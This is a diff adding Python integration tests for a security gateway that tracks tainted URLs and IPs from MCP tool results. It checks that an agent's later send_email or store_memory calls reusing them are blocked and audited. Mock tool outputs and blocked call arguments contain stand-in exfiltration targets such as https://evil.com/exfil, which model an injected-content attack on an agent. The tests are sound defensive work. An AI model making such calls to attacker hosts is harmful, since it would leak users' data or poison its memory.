@@ -1888,3 +1888,189 @@ class TestSemanticDefenseIntegration:
 
         assert result.risk_assessment.overall_risk_score == 0.0
         assert result.risk_assessment.raw_signals == []
+
+
+# --- PR 7: Taint tracking and sink policy integration ---
+
+
+class TestTaintTrackingIntegration:
+    """Verify taint tracking through the SecurityGateway.execute_tool() pipeline.
+
+    Tests the full flow: tool result containing URL → stored by TaintTracker →
+    next tool call with that URL → SinkPolicyEngine evaluates → blocked/allowed.
+    """
+
+    @pytest.fixture
+    def gateway_setup(self, tmp_path):
+        """Gateway with pre-approved tools for taint tracking tests."""
+        tool_names = ["echo", "add", "send_email", "store_memory"]
+        registry = ToolApprovalRegistry(str(tmp_path / "approved.json"))
+        for name in tool_names:
+            registry.approve(_make_tool_schema(name))
+
+        config = BridgeConfig(
+            servers={
+                "test-server": ServerConfig(
+                    command="echo",
+                    args=["test"],
+                    allowed_tools=tool_names,
+                    destructive_tools=[],
+                ),
+            },
+            security=SecurityConfig(
+                max_turns=5,
+                max_tool_calls_per_session=20,
+                rate_limit_per_server=10,
+            ),
+        )
+        mcp = MagicMock(spec=MCPClientManager)
+        mcp.list_all_tools = AsyncMock(return_value={
+            "test-server": [_make_tool_schema(n) for n in tool_names],
+        })
+        mcp.call_tool = AsyncMock(return_value="clean result")
+
+        audit = AuditLogger(str(tmp_path / "audit.jsonl"))
+        gateway = SecurityGateway(mcp, config, audit, registry=registry)
+        return gateway, mcp, audit
+
+    @pytest.mark.asyncio
+    async def test_tainted_url_in_subsequent_call_blocked(self, gateway_setup):
+        """Tool result with URL → next tool uses that URL → blocked."""
+        gateway, mcp, audit = gateway_setup
+        await gateway.connect_and_scan()
+
+        # Step 1: First tool returns content containing a URL
+        mcp.call_tool = AsyncMock(
+            return_value="Check out https://evil.com/exfil for more info"
+        )
+        tc1 = OllamaToolCall(
+            function_name="test-server__echo",
+            arguments={"input": "search"},
+        )
+        await gateway.execute_tool(tc1, model_id="test", turn=0)
+
+        # Step 2: Model tries to use that URL in a "send" tool call → blocked
+        mcp.call_tool = AsyncMock(return_value="sent")
+        tc2 = OllamaToolCall(
+            function_name="test-server__send_email",
+            arguments={"input": "data to https://evil.com/exfil"},
+        )
+        with pytest.raises(ToolBlockedError) as exc_info:
+            await gateway.execute_tool(tc2, model_id="test", turn=1)
+        assert "tainted_sink_blocked" in exc_info.value.reason
+
+    @pytest.mark.asyncio
+    async def test_clean_args_not_blocked(self, gateway_setup):
+        """Tool call with clean args (no taint match) proceeds normally."""
+        gateway, mcp, audit = gateway_setup
+        await gateway.connect_and_scan()
+
+        # First tool returns a URL
+        mcp.call_tool = AsyncMock(
+            return_value="Found at https://evil.com/something"
+        )
+        tc1 = OllamaToolCall(
+            function_name="test-server__echo",
+            arguments={"input": "search"},
+        )
+        await gateway.execute_tool(tc1, model_id="test", turn=0)
+
+        # Second tool uses a DIFFERENT URL → not tainted → allowed
+        mcp.call_tool = AsyncMock(return_value="ok")
+        tc2 = OllamaToolCall(
+            function_name="test-server__echo",
+            arguments={"input": "https://safe-and-different.com"},
+        )
+        result = await gateway.execute_tool(tc2, model_id="test", turn=1)
+        assert result.content  # executed successfully
+
+    @pytest.mark.asyncio
+    async def test_tainted_memory_write_blocked(self, gateway_setup):
+        """Tainted content to a memory-write tool is blocked."""
+        gateway, mcp, audit = gateway_setup
+        await gateway.connect_and_scan()
+
+        # Tool returns content with a URL
+        mcp.call_tool = AsyncMock(
+            return_value="Remember https://evil.com/payload"
+        )
+        tc1 = OllamaToolCall(
+            function_name="test-server__echo",
+            arguments={"input": "test"},
+        )
+        await gateway.execute_tool(tc1, model_id="test", turn=0)
+
+        # Model tries to store that URL in memory → blocked
+        mcp.call_tool = AsyncMock(return_value="stored")
+        tc2 = OllamaToolCall(
+            function_name="test-server__store_memory",
+            arguments={"input": "https://evil.com/payload"},
+        )
+        with pytest.raises(ToolBlockedError) as exc_info:
+            await gateway.execute_tool(tc2, model_id="test", turn=1)
+        assert "tainted_sink_blocked" in exc_info.value.reason
+
+    @pytest.mark.asyncio
+    async def test_tainted_sink_audit_events(self, gateway_setup):
+        """Blocked tainted sink produces audit event."""
+        gateway, mcp, audit = gateway_setup
+        await gateway.connect_and_scan()
+
+        mcp.call_tool = AsyncMock(
+            return_value="Visit https://evil.com/exfil"
+        )
+        tc1 = OllamaToolCall(
+            function_name="test-server__echo",
+            arguments={"input": "test"},
+        )
+        await gateway.execute_tool(tc1, model_id="test", turn=0)
+
+        mcp.call_tool = AsyncMock(return_value="sent")
+        tc2 = OllamaToolCall(
+            function_name="test-server__send_email",
+            arguments={"input": "send to https://evil.com/exfil"},
+        )
+        with pytest.raises(ToolBlockedError):
+            await gateway.execute_tool(tc2, model_id="test", turn=1)
+
+        # Check audit trail
+        entries = audit.get_session_entries()
+        taint_events = [
+            e for e in entries
+            if e.event_type == AuditEventType.TAINTED_SINK_BLOCKED
+        ]
+        assert len(taint_events) >= 1
+        assert "test-server:echo" in taint_events[0].reason
+
+    @pytest.mark.asyncio
+    async def test_tainted_general_write_allowed_with_notice(self, gateway_setup):
+        """Tainted args to a general write tool produce ALLOW_WITH_NOTICE (not blocked)."""
+        gateway, mcp, audit = gateway_setup
+        await gateway.connect_and_scan()
+
+        # Seed taint
+        mcp.call_tool = AsyncMock(
+            return_value="data from 192.168.1.100"
+        )
+        tc1 = OllamaToolCall(
+            function_name="test-server__echo",
+            arguments={"input": "test"},
+        )
+        await gateway.execute_tool(tc1, model_id="test", turn=0)
+
+        # Tool call with the tainted IP, but to a non-sensitive tool (general write)
+        mcp.call_tool = AsyncMock(return_value="added")
+        tc2 = OllamaToolCall(
+            function_name="test-server__add",
+            arguments={"input": "connect to 192.168.1.100"},
+        )
+        result = await gateway.execute_tool(tc2, model_id="test", turn=1)
+        assert result.content  # not blocked
+
+        # But audit should show TAINTED_SINK_DETECTED
+        entries = audit.get_session_entries()
+        detected_events = [
+            e for e in entries
+            if e.event_type == AuditEventType.TAINTED_SINK_DETECTED
+        ]
+        assert len(detected_events) >= 1
